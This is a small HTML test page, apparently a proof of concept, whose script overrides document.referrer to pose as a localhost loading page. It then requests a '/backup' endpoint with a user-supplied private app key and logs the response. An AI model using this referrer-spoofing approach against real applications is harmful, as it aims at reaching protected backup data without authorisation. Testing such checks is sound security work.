<html>
  <body>
    APPKEY: <input type="text" id="appkey" />
    <br>
    <button onclick="test()">Backup</button>
    <script language="JavaScript">
function test () {
  Object.defineProperty(document, "referrer", {get : function(){ return "http://127.0.0.1:60961/pages/loading.html" }})
  const xhr = new XMLHttpRequest()
  xhr.open('GET', '/backup')
  xhr.setRequestHeader('X-PRIVATE_APPKEY', document.getElementById('appkey').value)
  xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        console.log(xhr)
      }
  }
  xhr.send()
}
    </script>
  </body>
</html>
